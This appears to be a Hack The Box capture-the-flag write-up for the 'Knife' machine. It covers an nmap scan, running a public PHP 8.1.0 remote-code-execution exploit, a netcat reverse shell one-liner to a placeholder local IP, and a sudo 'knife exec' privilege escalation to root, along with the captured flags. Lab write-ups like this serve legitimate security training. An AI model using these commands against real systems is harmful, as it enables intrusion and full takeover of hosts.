# [Knife]()
Linux, 20 Points, Easy

ip=10.10.10.242

## User solution
The first thing is to do the nmap scan.
```console
┌──(kali㉿kali)-[~/HTB/Knife]
└─$ ip=10.10.10.242

┌──(kali㉿kali)-[~/HTB/Knife]
└─$ ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(kali㉿kali)-[~/HTB/Knife]
└─$ nmap -sC -sV -p$ports $ip -oA nmap_result
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 10:29 EDT
Nmap scan report for 10.10.10.242
Host is up (0.083s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
```
Now lets look at website at port 80. \
From the nmap scan we know that the server uses Apache 2.4.41 and Ubuntu OS. Using Wappalyzer we found it also uses PHP 8.1.0.\

There is a RCE exploit for PHP 8.1.0. Download it from [exploit-db](https://www.exploit-db.com/exploits/49933).

Run the exploit and got the flag
```console
┌──(kali㉿kali)-[~/HTB/Knife]
└─$ python3 exploits/49933.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/
Can't acces tty; job crontol turned off.
$ whoami
james

$ pwd
/

$ cd /home/james; ls; cat user*
authorized_keys
hello
hello.rb
user.txt
aec6c92f2b998dc3912f334ac0c69ed5
```
## Root solution
Before procedding lets get a reverse shell at port 5454 with `mkfifo /tmp/f; nc <local-ip> 5454 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` and run `nc -lvnp 5454` before running the command. 

I was unable to do the root part while the machine was active. Later from a help I realized I forgot to check GTFObins.

Coming to the process first we have to see which executables we can run as sudo.
```console
james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

```
Search GTFObins for knife you will get a command for shell
```console
james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'
# whoami
root
# cat root/root.txt
b1c946e0dcc0715cb9039799fe824278
```
